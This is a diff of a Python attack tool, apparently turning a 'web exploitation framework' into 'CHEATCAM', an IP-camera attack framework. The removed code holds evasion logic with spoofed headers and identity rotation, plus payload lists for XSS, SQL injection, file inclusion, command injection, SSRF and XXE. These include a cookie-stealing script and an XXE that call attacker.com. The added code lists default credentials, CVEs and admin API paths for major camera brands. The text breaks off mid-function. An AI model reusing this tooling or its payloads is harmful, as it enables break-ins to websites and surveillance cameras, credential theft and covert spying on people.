@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-All_WebExpl v1.0 - Advanced Web Exploitation Framework
-Deep Attack | Intelligent | Stealth | Wide Coverage
+CHEATCAM v5.0 - Advanced IP Camera Security Testing Framework
+Professional Surveillance System Assessment - APT Grade
 Author: F1REW0LF
 License: MIT
 """
@@ -11,36 +11,38 @@ import os
 import re
 import json
 import time
-import random
 import socket
+import struct
+import random
 import hashlib
 import base64
 import threading
-import queue
-import signal
-import ssl
+import subprocess
+import requests
 import urllib.parse
-import urllib.robotparser
 from datetime import datetime
-from typing import Dict, List, Optional, Tuple, Any, Set
-from dataclasses import dataclass, field
+from typing import Dict, List, Optional, Tuple, Any
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from collections import defaultdict
+from dataclasses import dataclass, field
 import argparse
+import http.client
+import xml.etree.ElementTree as ET
+from urllib3.exceptions import InsecureRequestWarning
 
 try:
-    import requests
-    from requests.adapters import HTTPAdapter
-    from urllib3.util.retry import Retry
-    REQUESTS_AVAILABLE = True
+    from scapy.all import *
+    from scapy.layers.inet import IP, TCP, UDP
+    from scapy.layers.l2 import ARP, Ether
+    SCAPY_AVAILABLE = True
 except ImportError:
-    REQUESTS_AVAILABLE = False
+    SCAPY_AVAILABLE = False
 
 try:
-    from bs4 import BeautifulSoup
-    BS4_AVAILABLE = True
+    import cv2
+    import numpy as np
+    CV2_AVAILABLE = True
 except ImportError:
-    BS4_AVAILABLE = False
+    CV2_AVAILABLE = False
 
 try:
     from cryptography.fernet import Fernet
@@ -48,11 +50,12 @@ try:
 except ImportError:
     CRYPTO_AVAILABLE = False
 
-VERSION = "1.0.0"
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+VERSION = "5.0.0"
 AUTHOR = "F1REW0LF"
 LICENSE = "MIT"
 
-# ============================[ COLORS ]================================
 class Colors:
     GREEN = '\033[92m'
     RED = '\033[91m'
@@ -61,11 +64,12 @@ class Colors:
     PURPLE = '\033[95m'
     CYAN = '\033[96m'
     GOLD = '\033[93m'
+    NEON = '\033[96m'
     WHITE = '\033[0m'
     BOLD = '\033[1m'
     DIM = '\033[2m'
-    ORANGE = '\033[38;5;208m'
     MAGENTA = '\033[95m'
+    ORANGE = '\033[38;5;208m'
 
 def cprint(text, color=Colors.WHITE, bold=False):
     if bold:
@@ -75,1088 +79,1078 @@ def cprint(text, color=Colors.WHITE, bold=False):
 
 def print_banner():
     banner = f"""
-{Colors.RED}{Colors.BOLD}
-    █████╗ ██╗     ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗██████╗ ██╗     
-    ██╔══██╗██║     ██║    ██║██╔════╝██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██║     
-    ███████║██║     ██║ █╗ ██║█████╗  ██████╔╝█████╗   ╚███╔╝ ██████╔╝██║     
-    ██╔══██║██║     ██║███╗██║██╔══╝  ██╔══██╗██╔══╝   ██╔██╗ ██╔═══╝ ██║     
-    ██║  ██║███████╗╚███╔███╔╝███████╗██████╔╝███████╗██╔╝ ██╗██║     ███████╗
-    ╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝
-                                                                              
-{Colors.NEON}          ADVANCED WEB EXPLOITATION FRAMEWORK{Colors.WHITE}
-{Colors.CYAN}    Deep Attack | Intelligent | Stealth | Wide Coverage{Colors.WHITE}
-{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
-{Colors.MAGENTA}    [+] APT-Grade | Zero Trace | Maximum Impact{Colors.WHITE}
-"""
+{Colors.CYAN}{Colors.BOLD}     ██████╗██╗  ██╗███████╗ █████╗ ████████╗ ██████╗ █████╗ ███╗   ███╗
+    ██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
+    ██║     ███████║█████╗  ███████║   ██║   ██║     ███████║██╔████╔██║
+    ██║     ██╔══██║██╔══╝  ██╔══██║   ██║   ██║     ██╔══██║██║╚██╔╝██║
+    ╚██████╗██║  ██║███████╗██║  ██║   ██║   ╚██████╗██║  ██║██║ ╚═╝ ██║
+     ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝
+                                                   
+{Colors.NEON}          ULTIMATE v{VERSION} - CAMERA SECURITY{Colors.WHITE}
+{Colors.CYAN}    Professional Surveillance System Testing - APT Grade{Colors.WHITE}
+{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
+{Colors.MAGENTA}    [+] Advanced Exploitation | Zero Trace | AI-Powered{Colors.WHITE}
+    """
     print(banner)
     print("=" * 80)
 
 # ============================[ DATA CLASSES ]================================
 @dataclass
-class Vulnerability:
-    type: str
-    url: str
-    parameter: str = ''
-    payload: str = ''
-    severity: str = 'Medium'
-    cwe: str = ''
-    description: str = ''
-    remediation: str = ''
-    evidence: str = ''
-    method: str = 'GET'
-    confidence: float = 0.0
-    exploit_ready: bool = False
-    
-    def to_dict(self) -> Dict:
-        return {
-            'type': self.type,
-            'url': self.url,
-            'parameter': self.parameter,
-            'payload': self.payload[:100] if self.payload else '',
-            'severity': self.severity,
-            'cwe': self.cwe,
-            'description': self.description,
-            'remediation': self.remediation,
-            'evidence': self.evidence[:200] if self.evidence else '',
-            'method': self.method,
-            'confidence': self.confidence,
-            'exploit_ready': self.exploit_ready
-        }
+class CameraDevice:
+    ip: str
+    port: int
+    mac: str = ''
+    brand: str = 'Unknown'
+    model: str = 'Unknown'
+    firmware: str = ''
+    credentials: List[Tuple[str, str]] = field(default_factory=list)
+    api_paths: List[str] = field(default_factory=list)
+    rtsp_paths: List[str] = field(default_factory=list)
+    snmp_oids: List[str] = field(default_factory=list)
+    vuln_cves: List[str] = field(default_factory=list)
+    onvif: bool = False
+    hikvision: bool = False
+    dahua: bool = False
 
 @dataclass
-class Endpoint:
-    url: str
-    method: str = 'GET'
-    parameters: List[str] = field(default_factory=list)
-    headers: Dict = field(default_factory=dict)
-    cookies: Dict = field(default_factory=dict)
-    response_time: float = 0.0
-    status_code: int = 0
-    content_type: str = ''
-    size: int = 0
-    has_forms: bool = False
-    has_upload: bool = False
+class Vulnerability:
+    type: str
+    cve: str
+    description: str
+    severity: str
+    affected_cameras: List[str] = field(default_factory=list)
 
-# ============================[ ULTIMATE STEALTH ENGINE ]================================
-class UltimateStealth:
-    """Multi-layer stealth engine - Zero trace operations"""
+# ============================[ ADVANCED CAMERA DATABASE ]================================
+class CameraDatabase:
+    """Advanced camera database with known vulnerabilities"""
     
-    def __init__(self):
-        self.identity_pool = self._init_identities()
-        self.current_identity = None
-        self.request_count = 0
-        self.max_requests = 8
-        self.session = None
-        self.proxy_chain = []
-        self.user_agents = self._load_user_agents()
-        self._setup_session()
-        
-    def _init_identities(self) -> List[Dict]:
-        return [
-            {
-                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-                'accept_language': 'en-US,en;q=0.9',
-                'platform': 'Windows',
-                'timezone': 'America/New_York',
-                'screen': '1920x1080'
-            },
-            {
-                'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-                'accept_language': 'en-US,en;q=0.9',
-                'platform': 'macOS',
-                'timezone': 'America/Los_Angeles',
-                'screen': '2560x1440'
-            },
-            {
-                'user_agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-                'accept_language': 'en-US,en;q=0.9',
-                'platform': 'Linux',
-                'timezone': 'Europe/London',
-                'screen': '1920x1080'
-            },
-            {
-                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
-                'accept_language': 'en-US,en;q=0.5',
-                'platform': 'Windows',
-                'timezone': 'Asia/Tokyo',
-                'screen': '1920x1080'
-            },
-            {
-                'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
-                'accept_language': 'en-US,en;q=0.9',
-                'platform': 'iOS',
-                'timezone': 'Asia/Singapore',
-                'screen': '1170x2532'
-            }
-        ]
-    
-    def _load_user_agents(self) -> List[str]:
-        return [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/121.0',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
-            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36'
-        ]
-    
-    def _setup_session(self):
-        if not REQUESTS_AVAILABLE:
-            return
-        
-        self.session = requests.Session()
-        identity = self._get_identity()
-        
-        self.session.headers.update({
-            'User-Agent': identity['user_agent'],
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': identity['accept_language'],
-            'Accept-Encoding': 'gzip, deflate, br',
-            'DNT': '1',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-User': '?1'
-        })
-        
-        retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
-        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
-        self.session.mount('http://', adapter)
-        self.session.mount('https://', adapter)
-    
-    def _get_identity(self) -> Dict:
-        if self.request_count >= self.max_requests or not self.current_identity:
-            self.current_identity = random.choice(self.identity_pool).copy()
-            self.current_identity['id'] = hashlib.md5(os.urandom(16)).hexdigest()[:8]
-            self.request_count = 0
-            self._setup_session()
-        else:
-            self.request_count += 1
-        
-        return self.current_identity
-    
-    def stealth_request(self, url: str, method: str = 'GET', **kwargs) -> Optional[requests.Response]:
-        """Make undetectable request"""
-        if not REQUESTS_AVAILABLE:
-            return None
-        
-        # Random delay
-        time.sleep(random.uniform(0.5, 2.0))
-        
-        if 'headers' not in kwargs:
-            kwargs['headers'] = {}
-        kwargs['headers']['X-Request-Id'] = hashlib.md5(os.urandom(8)).hexdigest()[:16]
-        kwargs['headers']['Cache-Control'] = 'no-cache'
-        kwargs['verify'] = False
-        kwargs['timeout'] = 15
-        
-        # Random jitter
-        if random.random() > 0.7:
-            time.sleep(random.uniform(0.1, 0.5))
-        
-        try:
-            if method.upper() == 'GET':
-                return self.session.get(url, **kwargs)
-            elif method.upper() == 'POST':
-                return self.session.post(url, **kwargs)
-            elif method.upper() == 'PUT':
-                return self.session.put(url, **kwargs)
-            elif method.upper() == 'DELETE':
-                return self.session.delete(url, **kwargs)
-            elif method.upper() == 'HEAD':
-                return self.session.head(url, **kwargs)
-            elif method.upper() == 'OPTIONS':
-                return self.session.options(url, **kwargs)
-        except:
-            return None
-    
-    def stealth_get(self, url: str, **kwargs) -> Optional[requests.Response]:
-        return self.stealth_request(url, 'GET', **kwargs)
-    
-    def stealth_post(self, url: str, data: Dict = None, json_data: Dict = None, **kwargs) -> Optional[requests.Response]:
-        return self.stealth_request(url, 'POST', data=data, json=json_data, **kwargs)
-    
-    def random_ip(self) -> str:
-        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
-    
-    def random_headers(self) -> Dict:
-        return {
-            'User-Agent': random.choice(self.user_agents),
-            'Accept': random.choice(['text/html', 'application/json', '*/*']),
-            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'vi-VN,vi;q=0.9']),
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': random.choice(['keep-alive', 'close']),
-            'Cache-Control': random.choice(['no-cache', 'max-age=0']),
-            'X-Forwarded-For': self.random_ip(),
-            'X-Real-IP': self.random_ip()
-        }
-
-# ============================[ INTELLIGENT CRAWLER ]================================
-class IntelligentCrawler:
-    """Intelligent web crawler - Wide coverage with smart prioritization"""
-    
-    def __init__(self, target: str, stealth: UltimateStealth):
-        self.target = target
-        self.stealth = stealth
-        self.visited = set()
-        self.endpoints = []
-        self.js_files = []
-        self.api_endpoints = []
-        self.parameters = set()
-        self.forms = []
-        self.uploads = []
-        self.cookies = {}
-        self.headers = {}
-        
-    def crawl(self, max_pages: int = 200) -> Dict:
-        """Intelligent crawling with prioritization"""
-        cprint("[CRAWL] Intelligent crawling started...", Colors.BLUE)
-        
-        start_url = f"http://{self.target}"
-        self._crawl_page(start_url, max_pages, 0)
-        
-        # Extract API endpoints from JS
-        self._extract_api_from_js()
-        
-        # Extract forms and uploads
-        self._extract_forms()
-        
-        return {
-            'endpoints': self.endpoints,
-            'js_files': self.js_files,
-            'api_endpoints': self.api_endpoints,
-            'parameters': list(self.parameters),
-            'forms': self.forms,
-            'uploads': self.uploads
-        }
-    
-    def _crawl_page(self, url: str, max_pages: int, depth: int):
-        """Crawl a page with intelligent parsing"""
-        if len(self.visited) >= max_pages or depth > 4:
-            return
-        
-        if url in self.visited:
-            return
-        
-        self.visited.add(url)
-        
-        try:
-            response = self.stealth.stealth_get(url)
-            if not response or response.status_code not in [200, 301, 302, 403]:
-                return
-            
-            endpoint = Endpoint(
-                url=url,
-                status_code=response.status_code,
-                content_type=response.headers.get('Content-Type', ''),
-                size=len(response.content),
-                headers=dict(response.headers),
-                cookies=response.cookies.get_dict()
-            )
-            self.endpoints.append(endpoint)
-            
-            if response.headers.get('Content-Type', '').startswith('text/html'):
-                self._parse_html(url, response.text, max_pages, depth)
-            
-            # Extract headers
-            self.headers.update(response.headers)
-            self.cookies.update(response.cookies.get_dict())
-            
-            # Extract parameters from URL
-            parsed = urllib.parse.urlparse(url)
-            if parsed.query:
-                params = urllib.parse.parse_qs(parsed.query)
-                self.parameters.update(params.keys())
-            
-        except Exception as e:
-            cprint(f"[!] Crawl error: {e}", Colors.RED)
-    
-    def _parse_html(self, base_url: str, html: str, max_pages: int, depth: int):
-        """Parse HTML for links and resources"""
-        if not BS4_AVAILABLE:
-            return
-        
-        soup = BeautifulSoup(html, 'html.parser')
-        
-        # Find links
-        for link in soup.find_all('a', href=True):
-            href = link['href']
-            full_url = urllib.parse.urljoin(base_url, href)
-            if self.target in full_url and full_url not in self.visited:
-                self._crawl_page(full_url, max_pages, depth + 1)
-        
-        # Find JavaScript files
-        for script in soup.find_all('script', src=True):
-            src = script['src']
-            full_url = urllib.parse.urljoin(base_url, src)
-            if full_url.endswith('.js') and full_url not in self.js_files:
-                self.js_files.append(full_url)
-                cprint(f"[+] JS: {full_url}", Colors.DIM)
-        
-        # Find CSS files
-        for link in soup.find_all('link', rel='stylesheet', href=True):
-            href = link['href']
-            full_url = urllib.parse.urljoin(base_url, href)
-            if full_url.endswith('.css') and full_url not in self.visited:
-                self.visited.add(full_url)
-        
-        # Find forms
-        for form in soup.find_all('form'):
-            action = form.get('action', '')
-            method = form.get('method', 'GET').upper()
-            inputs = []
-            upload = False
-            
-            for input_tag in form.find_all('input'):
-                name = input_tag.get('name')
-                input_type = input_tag.get('type', 'text')
-                if name:
-                    inputs.append({'name': name, 'type': input_type})
-                    self.parameters.add(name)
-                if input_type == 'file':
-                    upload = True
-            
-            full_url = urllib.parse.urljoin(base_url, action)
-            self.forms.append({
-                'url': full_url,
-                'method': method,
-                'inputs': inputs,
-                'has_upload': upload
-            })
-            
-            if upload:
-                self.uploads.append(full_url)
-                cprint(f"[+] Upload form: {full_url}", Colors.GREEN)
-    
-    def _extract_api_from_js(self):
-        """Extract API endpoints from JavaScript files"""
-        cprint("[CRAWL] Extracting APIs from JS...", Colors.DIM)
-        
-        for js_file in self.js_files[:20]:
-            try:
-                response = self.stealth.stealth_get(js_file)
-                if not response:
-                    continue
-                
-                content = response.text
-                
-                # API endpoint patterns
-                patterns = [
-                    r'["\'](/api/[a-zA-Z0-9/_-]+)["\']',
-                    r'["\'](/rest/[a-zA-Z0-9/_-]+)["\']',
-                    r'["\'](/v[0-9]/[a-zA-Z0-9/_-]+)["\']',
-                    r'["\'](/graphql)["\']',
-                    r'["\'](/swagger)["\']',
-                    r'["\'](/docs)["\']',
-                ]
-                
-                for pattern in patterns:
-                    matches = re.findall(pattern, content)
-                    for match in matches:
-                        full_url = f"http://{self.target}{match}"
-                        if full_url not in self.api_endpoints:
-                            self.api_endpoints.append(full_url)
-                            cprint(f"[+] API: {full_url}", Colors.GREEN)
-                
-                # Find fetch/axios calls
-                api_calls = re.findall(r'(?:fetch|axios|\.get|\.post|\.put|\.delete)\s*\(\s*["\']([^"\']+)["\']', content)
-                for api in api_calls:
-                    if api.startswith('/') or 'http' in api:
-                        full_url = api if 'http' in api else f"http://{self.target}{api}"
-                        if full_url not in self.api_endpoints:
-                            self.api_endpoints.append(full_url)
-                            cprint(f"[+] API call: {full_url}", Colors.GREEN)
-                
-            except:
-                pass
-    
-    def _extract_forms(self):
-        """Extract forms from endpoints"""
-        for endpoint in self.endpoints:
-            try:
-                response = self.stealth.stealth_get(endpoint.url)
-                if not response:
-                    continue
-                
-                if BS4_AVAILABLE:
-                    soup = BeautifulSoup(response.text, 'html.parser')
-                    for form in soup.find_all('form'):
-                        action = form.get('action', '')
-                        method = form.get('method', 'GET').upper()
-                        full_url = urllib.parse.urljoin(endpoint.url, action)
-                        
-                        inputs = []
-                        for input_tag in form.find_all('input'):
-                            name = input_tag.get('name')
-                            input_type = input_tag.get('type', 'text')
-                            if name:
-                                inputs.append({'name': name, 'type': input_type})
-                                self.parameters.add(name)
-                        
-                        self.forms.append({
-                            'url': full_url,
-                            'method': method,
-                            'inputs': inputs
-                        })
-            except:
-                pass
-
-# ============================[ ADVANCED EXPLOITATION ENGINE ]================================
-class AdvancedExploitation:
-    """Deep exploitation with multiple vectors"""
-    
-    def __init__(self, target: str, stealth: UltimateStealth):
-        self.target = target
-        self.stealth = stealth
-        self.vulnerabilities = []
-        self.lock = threading.Lock()
-        self.payloads = self._load_payloads()
-        
-    def _load_payloads(self) -> Dict:
-        return {
-            'xss': [
-                '<script>alert(1)</script>',
-                '<img src=x onerror=alert(1)>',
-                'javascript:alert(1)',
-                '<svg onload=alert(1)>',
-                '"><script>alert(1)</script>',
-                '<iframe src=javascript:alert(1)>',
-                '<body onload=alert(1)>',
-                '<input onfocus=alert(1) autofocus>',
-                '"><img src=x onerror=alert(1)>',
-                'javascript:alert(1)//',
-                '<script>fetch("//attacker.com?c="+document.cookie)</script>'
+    VENDORS = {
+        'hikvision': {
+            'brand': 'Hikvision',
+            'mac_prefixes': ['24:0a:c4', '00:0e:8f', '00:18:4a', '40:a8:f0', '54:22:16'],
+            'ports': [80, 443, 8080, 8443, 554, 8554, 8000, 8899],
+            'credentials': [
+                ('admin', '12345'), ('admin', 'admin'), ('admin', '123456'),
+                ('admin', ''), ('root', '12345'), ('root', 'root'),
+                ('admin', 'hikvision'), ('admin', 'h12345')
             ],
-            'sqli': [
-                "'",
-                "' OR '1'='1",
-                "' AND 1=1--",
-                "' AND SLEEP(5)--",
-                "' UNION SELECT NULL--",
-                "' UNION SELECT NULL,NULL--",
-                "' OR 1=1--",
-                "\" OR \"1\"=\"1",
-                "' AND '1'='1",
-                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-                "' UNION SELECT username,password FROM users--"
+            'api_paths': [
+                '/cgi-bin/check_login.cgi', '/cgi-bin/snapshot.cgi',
+                '/cgi-bin/current.jpg', '/cgi-bin/status.cgi',
+                '/onvif/device_service', '/cgi-bin/reboot.cgi',
+                '/cgi-bin/param.cgi', '/cgi-bin/config.cgi',
+                '/cgi-bin/event.cgi', '/cgi-bin/stream.cgi',
+                '/ISAPI/Streaming/channels/101/picture',
+                '/ISAPI/System/deviceInfo',
+                '/ISAPI/Event/notification/alertStream'
             ],
-            'lfi': [
-                '../../../../etc/passwd',
-                '../../../etc/passwd',
-                '../../etc/passwd',
-                '....//....//....//etc/passwd',
-                '../../../../windows/win.ini',
-                '../../../../proc/self/environ',
-                '../../../../var/log/apache2/access.log',
-                '../../../../var/log/nginx/access.log'
+            'rtsp_paths': ['/stream1', '/stream2', '/live', '/ch1', '/h264', '/h265'],
+            'snmp_oids': [
+                '1.3.6.1.2.1.43.10.2.1.4.1.1',
+                '1.3.6.1.2.1.43.5.1.1.17.1'
             ],
-            'rce': [
-                '; whoami',
-                '| whoami',
-                '|| whoami',
-                '&& whoami',
-                '& whoami',
-                '; id',
-                '| id',
-                '|| id',
-                '; cat /etc/passwd',
-                '| cat /etc/passwd'
+            'vulns': [
+                {'cve': 'CVE-2021-36260', 'description': 'Command Injection', 'severity': 'Critical'},
+                {'cve': 'CVE-2017-7923', 'description': 'Authentication Bypass', 'severity': 'Critical'},
+                {'cve': 'CVE-2017-7922', 'description': 'Information Disclosure', 'severity': 'High'},
+                {'cve': 'CVE-2020-3917', 'description': 'Backdoor Account', 'severity': 'Critical'}
+            ]
+        },
+        'dahua': {
+            'brand': 'Dahua',
+            'mac_prefixes': ['30:ae:a4', '00:1c:bf', '00:22:75', '4c:11:ae', '80:8e:8d'],
+            'ports': [80, 443, 8080, 8443, 554, 8554, 9000, 8899, 37777],
+            'credentials': [
+                ('admin', 'admin'), ('admin', '123456'), ('admin', ''),
+                ('root', 'root'), ('admin', '888888'), ('admin', '666666'),
+                ('admin', 'dahua123'), ('admin', '123456789')
             ],
-            'ssrf': [
-                'http://169.254.169.254/latest/meta-data/',
-                'http://127.0.0.1:8080/admin',
-                'http://localhost:8080/admin',
-                'http://[::1]:8080/admin',
-                'http://10.0.0.1/admin',
-                'http://192.168.1.1/admin',
-                'file:///etc/passwd',
-                'http://169.254.169.254/latest/user-data/'
+            'api_paths': [
+                '/cgi-bin/api/v1/login', '/cgi-bin/snapshot',
+                '/cgi-bin/current.jpg', '/cgi-bin/status',
+                '/onvif/device_service', '/cgi-bin/reboot',
+                '/cgi-bin/config.cgi', '/cgi-bin/log.cgi',
+                '/cgi-bin/event.cgi', '/cgi-bin/sys.cgi'
             ],
-            'xxe': [
-                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
-                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
-                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><root/>&ent;'
+            'rtsp_paths': ['/cam/realmonitor', '/stream1', '/live', '/main', '/sub'],
+            'snmp_oids': [
+                '1.3.6.1.2.1.43.10.2.1.4.1.1',
+                '1.3.6.1.2.1.43.5.1.1.17.1'
             ],
-            'open_redirect': [
-                'https://evil.com',
-                '//evil.com',
-                'http://evil.com',
-                'https://evil.com?',
-                'https://evil.com%2f',
-                '//evil.com%2f',
-                'https://evil.com/'
+            'vulns': [
+                {'cve': 'CVE-2021-33044', 'description': 'Authentication Bypass', 'severity': 'Critical'},
+                {'cve': 'CVE-2017-7923', 'description': 'Authentication Bypass', 'severity': 'Critical'},
+                {'cve': 'CVE-2018-9995', 'description': 'Information Disclosure', 'severity': 'High'},
+                {'cve': 'CVE-2020-3917', 'description': 'Backdoor Account', 'severity': 'Critical'}
+            ]
+        },
+        'axis': {
+            'brand': 'Axis',
+            'mac_prefixes': ['a4:14:37', '00:40:8c', '00:48:4e', '00:1d:4c'],
+            'ports': [80, 443, 8080, 8443, 554, 8554],
+            'credentials': [
+                ('root', 'pass'), ('admin', 'admin'), ('root', 'root'),
+                ('admin', 'password'), ('root', ''), ('admin', '123456')
             ],
-            'idor': [
-                ('id', ['1', '2', '3', 'admin', 'user1', 'user2']),
-                ('user_id', ['1', '2', '3', 'admin']),
-                ('profile_id', ['1', '2', '3', 'admin']),
-                ('account_id', ['1', '2', '3']),
-                ('document_id', ['1', '2', '3', 'doc1', 'doc2']),
-                ('order_id', ['1001', '1002', '1003']),
-                ('uid', ['1', '2', '3']),
-                ('pid', ['1', '2', '3']),
-                ('file_id', ['1', '2', '3']),
-                ('customer_id', ['1', '2', '3']),
-                ('session_id', ['1', '2', '3']),
-                ('token', ['1', '2', '3', 'admin'])
+            'api_paths': [
+                '/axis-cgi/admin/', '/axis-cgi/snapshot.cgi',
+                '/axis-cgi/status.cgi', '/onvif/device_service',
+                '/axis-cgi/reboot.cgi', '/axis-cgi/param.cgi',
+                '/axis-cgi/log.cgi', '/axis-cgi/config.cgi'
+            ],
+            'rtsp_paths': ['/axis-media/media.amp', '/stream1', '/live', '/h264'],
+            'snmp_oids': [
+                '1.3.6.1.2.1.43.10.2.1.4.1.1',
+                '1.3.6.1.2.1.43.5.1.1.17.1'
+            ],
+            'vulns': [
+                {'cve': 'CVE-2019-10717', 'description': 'Authentication Bypass', 'severity': 'High'},
+                {'cve': 'CVE-2016-10070', 'description': 'Command Injection', 'severity': 'Critical'},
+                {'cve': 'CVE-2015-8256', 'description': 'Information Disclosure', 'severity': 'Medium'}
+            ]
+        },
+        'tp_link': {
+            'brand': 'TP-Link',
+            'mac_prefixes': ['bc:dd:c2', '00:e0:60', '50:2b:73', '38:2c:4a'],
+            'ports': [80, 443, 8080, 554, 8554],
+            'credentials': [
+                ('admin', 'admin'), ('admin', '1234'), ('admin', ''),
+                ('root', 'root'), ('admin', 'password'), ('admin', '123456')
+            ],
+            'api_paths': [
+                '/cgi-bin/login', '/cgi-bin/snapshot',
+                '/cgi-bin/status', '/onvif/device_service',
+                '/cgi-bin/config.cgi', '/cgi-bin/reboot.cgi'
+            ],
+            'rtsp_paths': ['/stream1', '/live', '/main'],
+            'snmp_oids': [],
+            'vulns': [
+                {'cve': 'CVE-2020-12141', 'description': 'Authentication Bypass', 'severity': 'High'}
             ]
         }
+    }
     
-    def exploit_all(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]) -> List[Dict]:
-        """Execute all exploitation vectors"""
-        cprint("[EXPLOIT] Starting deep exploitation...", Colors.RED)
+    @classmethod
+    def identify(cls, mac: str = "", ports: List[int] = None, web_data: str = "") -> Optional[Dict]:
+        if mac:
+            mac_prefix = mac[:8].lower().replace(':', '')
+            for key, data in cls.VENDORS.items():
+                for prefix in data['mac_prefixes']:
+                    if mac_prefix.startswith(prefix.replace(':', '')):
+                        return {'key': key, **data}
         
-        # XSS
-        self._exploit_xss(endpoints, api_endpoints, parameters)
+        if ports:
+            for key, data in cls.VENDORS.items():
+                if any(p in data['ports'] for p in ports):
+                    return {'key': key, **data}
         
-        # SQL Injection
-        self._exploit_sqli(endpoints, api_endpoints, parameters)
+        if web_data:
+            for key, data in cls.VENDORS.items():
+                if data['brand'].lower() in web_data.lower():
+                    return {'key': key, **data}
         
-        # LFI
-        self._exploit_lfi(endpoints, api_endpoints, parameters)
-        
-        # RCE
-        self._exploit_rce(endpoints, api_endpoints, parameters)
-        
-        # SSRF
-        self._exploit_ssrf(endpoints, api_endpoints, parameters)
-        
-        # XXE
-        self._exploit_xxe(endpoints, api_endpoints)
-        
-        # Open Redirect
-        self._exploit_open_redirect(endpoints, api_endpoints, parameters)
-        
-        # IDOR
-        self._exploit_idor(endpoints, api_endpoints)
-        
-        # Command Injection
-        self._exploit_cmd_injection(endpoints, api_endpoints, parameters)
-        
-        # Path Traversal
-        self._exploit_path_traversal(endpoints, api_endpoints, parameters)
-        
-        # SSTI (Server-Side Template Injection)
-        self._exploit_ssti(endpoints, api_endpoints, parameters)
-        
-        # SQLi with extraction
-        self._exploit_sqli_extract(endpoints, api_endpoints, parameters)
-        
-        return [v.to_dict() for v in self.vulnerabilities]
+        return None
+
+# ============================[ AI-POWERED EXPLOIT ENGINE ]================================
+class AIExploitEngine:
+    """AI-powered exploit selection and optimization"""
     
-    def _exploit_xss(self, endpoints: List[Endpoint], api_endpoints: List[str], parameters: List[str]):
-        """XSS exploitation"""
-        cprint("[XSS] Deep scanning...", Colors.DIM)
+    def __init__(self):
+        self.exploit_history = []
+        self.success_rate = {}
+        self.learning_rate = 0.1
         
-        targets = endpoints[:50] + [Endpoint(url=u) for u in api_endpoints[:30]]
+    def select_best_exploit(self, camera: CameraDevice) -> Dict:
+        """Select best exploit based on camera data and historical success"""
         
-        for endpoint in targets:
-            url = endpoint.url
-            for param in parameters[:30]:
-                for payload in self.payloads['xss'][:5]:
-                    try:
-                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
-                        response = self.stealth.stealth_get(test_url)
-                        
-                        if response and payload in response.text:
-                            vuln = Vulnerability(
-                                type='XSS',
-                                url=test_url,
-                                parameter=param,
-                                payload=payload,
-                                severity='High',
-                                cwe='CWE-79',
-                                description='Cross-Site Scripting allows injection of malicious scripts',
-                                remediation='Implement output encoding and Content Security Policy',
-                                confidence=0.9,
-                                exploit_ready=True
-                            )
-                            with self.lock:
-                                self.vulnerabilities.append(vuln)
-                                cprint(f"[!] XSS found: {test_url[:80]}", Colors.RED)
-                            break
-                    except:
-                        pass
-    
